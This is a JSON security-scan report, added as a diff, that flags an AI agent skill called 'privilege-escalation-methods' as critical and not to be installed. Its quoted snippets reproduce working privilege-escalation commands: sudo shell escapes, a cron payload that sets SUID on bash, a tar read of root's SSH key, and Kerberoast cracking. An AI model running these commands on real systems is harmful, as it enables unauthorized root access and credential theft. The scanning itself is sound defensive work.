@@ -1,0 +1,686 @@
+{
+  "batch": {
+    "scanned_at": "2026-08-16T19:25:00.894166+00:00",
+    "total_skills": 1,
+    "scan_mode": "multilingual-enhanced",
+    "enhancements": {
+      "language_detection": "unicode-script-ratio",
+      "languages_detected": {},
+      "gap_fill_applied": 0,
+      "gap_fill_findings": 0
+    },
+    "inspection_completeness": {
+      "failed_executions": 1,
+      "incomplete_skills": 1,
+      "partially_inspected_files": 0,
+      "entirely_uninspected_files": 0
+    }
+  },
+  "skills": [
+    {
+      "skill": {
+        "name": "privilege-escalation-methods",
+        "source": "privilege-escalation-methods--benjaminastera-antigravity-awesome-skills-skills-privilege-escalation-methods-skill-md",
+        "source_group": ".",
+        "language": "en",
+        "scanned_at": "2026-08-16T19:25:00.892554+00:00"
+      },
+      "risk_assessment": {
+        "score": 100,
+        "severity": "CRITICAL",
+        "recommendation": "DO NOT INSTALL"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 338,
+          "executable": false,
+          "size_bytes": 8122
+        }
+      ],
+      "issues": [
+        {
+          "id": "PE1",
+          "finding_id": "finding-eced4b07b09a4400b425b3b5a9ba6eea",
+          "category": "Privilege Escalation",
+          "pattern": "Excessive Permissions",
+          "severity": "LOW",
+          "confidence": 0.8,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 3,
+            "end_line": null
+          },
+          "finding": "escalate privileges",
+          "explanation": "Skill requests more permissions than appear necessary for its stated functionality. Review if elevated access is justified.",
+          "remediation": "Request only the minimum permissions required. Document why each permission is needed. Remove broad permissions like '*' or 'all'.",
+          "code_snippet": "---\nname: privilege-escalation-methods\ndescription: \"This skill should be used when the user asks to \\\"escalate privileges\\\", \\\"get root access\\\", \\\"become administrator\\\", \\\"privesc techniques\\\", \\\"abuse sudo\\\", \\\"exploit SUID binaries\\\", \\\"K...\"\nmetadata:\n  author: zebbern\n  version: \"1.1\"",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-dfc9e8a616a64f118bf85d9d047ac981",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 38,
+            "end_line": null
+          },
+          "finding": "Sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n### Linux Privilege Escalation\n\n#### 1. Abusing Sudo Binaries\n\nExploit misconfigured sudo permissions using GTFOBins techniques:\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-7441490a4342457e9a88a32e6c3cc7a8",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 47,
+            "end_line": null
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo -l\n\n# Exploit common binaries\nsudo vim -c ':!/bin/bash'\nsudo find /etc/passwd -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python -c 'import pty;pty.spawn(\"/bin/bash\")'",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-c29ef01c6cc04b2c84dba46e2899b218",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 48,
+            "end_line": null
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n# Exploit common binaries\nsudo vim -c ':!/bin/bash'\nsudo find /etc/passwd -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python -c 'import pty;pty.spawn(\"/bin/bash\")'\nsudo perl -e 'exec \"/bin/bash\";'",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-e85a4410e58c49228a47e9721495ea96",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 49,
+            "end_line": null
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "# Exploit common binaries\nsudo vim -c ':!/bin/bash'\nsudo find /etc/passwd -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python -c 'import pty;pty.spawn(\"/bin/bash\")'\nsudo perl -e 'exec \"/bin/bash\";'\nsudo less /etc/hosts    # then type: !bash",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-c9a43dfd41e74142ba4b423a009190ac",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 50,
+            "end_line": null
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo vim -c ':!/bin/bash'\nsudo find /etc/passwd -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python -c 'import pty;pty.spawn(\"/bin/bash\")'\nsudo perl -e 'exec \"/bin/bash\";'\nsudo less /etc/hosts    # then type: !bash\nsudo man man            # then type: !bash",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-bb3291e2fe5f49629f4e12f69ed5f070",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 51,
+            "end_line": null
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo find /etc/passwd -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python -c 'import pty;pty.spawn(\"/bin/bash\")'\nsudo perl -e 'exec \"/bin/bash\";'\nsudo less /etc/hosts    # then type: !bash\nsudo man man            # then type: !bash\nsudo env /bin/bash",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-cf084f4394614512bd18eeeac99218c0",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 255,
+            "end_line": null
+          },
+          "finding": "Sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n| Technique | OS | Domain Required | Tool |\n|-----------|-----|-----------------|------|\n| Sudo Binary Abuse | Linux | No | GTFOBins |\n| Cron Job Exploit | Linux | No | Manual |\n| Capability Abuse | Linux | No | getcap |\n| NFS no_root_squash | Linux | No | mount |",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-38cc6da7a111438bb2c6b1d26d16b681",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 65,
+            "end_line": null
+          },
+          "finding": "chmod +s",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "cat /etc/crontab\n\n# Inject payload into writable script\necho 'chmod +s /bin/bash' > /home/user/systemupdate.sh\nchmod +x /home/user/systemupdate.sh\n\n# Wait for execution, then:",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-4b7031767c854b2881ac7ebb8c323df3",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.45,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 85,
+            "end_line": null
+          },
+          "finding": "/.ssh/id_rsa",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'\n\n# Tar with cap_dac_read_search (read any file)\n/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa\n/usr/bin/tar -xvf key.tar\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-d5f00309d5f14e4bac81ad1291d80082",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 48,
+            "end_line": null
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "\n# Exploit common binaries\nsudo vim -c ':!/bin/bash'\nsudo find /etc/passwd -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python -c 'import pty;pty.spawn(\"/bin/bash\")'\nsudo perl -e 'exec \"/bin/bash\";'",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "TM2",
+          "finding_id": "finding-5418d215c18f462bbcaa96fa1e3ebf76",
+          "category": "Tool Misuse",
+          "pattern": "Chaining Abuse",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 48,
+            "end_line": null
+          },
+          "finding": ";\nsudo",
+          "explanation": "Tool calls are chained to bypass individual safety checks or escalate capabilities beyond what any single tool call would allow.",
+          "remediation": "Limit tool chaining depth and validate the output of each tool before passing it to the next. Require explicit user approval for multi-step chains.",
+          "code_snippet": "\n# Exploit common binaries\nsudo vim -c ':!/bin/bash'\nsudo find /etc/passwd -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python -c 'import pty;pty.spawn(\"/bin/bash\")'\nsudo perl -e 'exec \"/bin/bash\";'",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "TM2",
+          "finding_id": "finding-dcd72337cd764e2899dcaaff1e08f4f5",
+          "category": "Tool Misuse",
+          "pattern": "Chaining Abuse",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 255,
+            "end_line": null
+          },
+          "finding": "| Sudo ",
+          "explanation": "Tool calls are chained to bypass individual safety checks or escalate capabilities beyond what any single tool call would allow.",
+          "remediation": "Limit tool chaining depth and validate the output of each tool before passing it to the next. Require explicit user approval for multi-step chains.",
+          "code_snippet": "\n| Technique | OS | Domain Required | Tool |\n|-----------|-----|-----------------|------|\n| Sudo Binary Abuse | Linux | No | GTFOBins |\n| Cron Job Exploit | Linux | No | Manual |\n| Capability Abuse | Linux | No | getcap |\n| NFS no_root_squash | Linux | No | mount |",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "TM2",
+          "finding_id": "finding-33df4fcb6ba24a88be986a44201095e6",
+          "category": "Tool Misuse",
+          "pattern": "Chaining Abuse",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 321,
+            "end_line": null
+          },
+          "finding": "| sudo ",
+          "explanation": "Tool calls are chained to bypass individual safety checks or escalate capabilities beyond what any single tool call would allow.",
+          "remediation": "Limit tool chaining depth and validate the output of each tool before passing it to the next. Require explicit user approval for multi-step chains.",
+          "code_snippet": "\n| Issue | Solution |\n|-------|----------|\n| sudo -l requires password | Try other enumeration (SUID, cron, capabilities) |\n| Mimikatz blocked by AV | Use Invoke-Mimikatz or SafetyKatz |\n| Kerberoasting returns no hashes | Check for service accounts with SPNs |\n| Token impersonation fails | Verify SeImpersonatePrivilege is present |",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-10f03970de01473f80e669a4320dce01",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'offensive_tool_references': References to well-known offensive security tools [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.35,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 312,
+            "end_line": null
+          },
+          "finding": "hashcat -m; BloodHound; CrackMapExec; crackmapexec",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
+          "code_snippet": "$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request\n\n# Crack with hashcat\n$ hashcat -m 13100 hashes.txt rockyou.txt\n```\n\n---",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-250c9473b5f24f68bba490742d03dc9b",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'privilege_escalation_tools': Privilege escalation tools and techniques [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 332,
+            "end_line": null
+          },
+          "finding": "LinPEAS; WinPEAS; SweetPotato; sweetpotato; SweetPotato",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
+          "code_snippet": "## Additional Resources\n\nFor detailed enumeration scripts, use:\n- **LinPEAS**: Linux privilege escalation enumeration\n- **WinPEAS**: Windows privilege escalation enumeration\n- **BloodHound**: Active Directory attack path mapping\n- **GTFOBins**: Unix binary exploitation reference",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "YR1",
+          "finding_id": "finding-97ae0a866c3c4b81a53f093bf08e4d4c",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'info_stealer': Information stealer patterns (credential harvesting, browser data theft) [malware]",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 21,
+            "end_line": null
+          },
+          "finding": "Mimikatz; mimikatz; mimikatz; mimikatz; mimikatz; mimikatz; mimikatz; Mimikatz; Mimikatz; Mimikatz; Mimikatz; ntds.dit; ntds.dit; NTDS.dit",
+          "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+          "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+          "code_snippet": "\n- Initial low-privilege shell access on target system\n- Kali Linux or penetration testing distribution\n- Tools: Mimikatz, PowerView, PowerUpSQL, Responder, Impacket, Rubeus\n- Understanding of Windows/Linux privilege models\n- For AD attacks: Domain user credentials and network access to DC\n",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "language_compatible": true
+        }
+      ],
+      "execution_successful": false,
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": false,
+        "execution_successful": false,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "failed",
+            "phase": "meta",
+            "reason_code": "llm_batch_failed",
+            "message": "LLM analysis failed for this file range.",
+            "path": "SKILL.md",
+            "start_line": null,
+            "end_line": null,
+            "fatal": true,
+            "analyzers": [
+              "meta_analyzer"
+            ],
+            "error_class": "APITimeoutError"
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "failed",
+            "planned_work": 1,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 1,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "limitations": [
+          "Analyzer meta_analyzer status: failed."
+        ],
+        "findings_before_filtering": 17,
+        "findings_after_filtering": 17
+      },
+      "scan_mode": "multilingual-enhanced",
+      "enhancements": {
+        "gap_fill_applied": false,
+        "gap_fill_findings": 0,
+        "english_keyword_rules_skipped": 0
+      }
+    }
+  ],
+  "metadata": {
+    "skillspector_version": "2.9.3"
+  }
+}
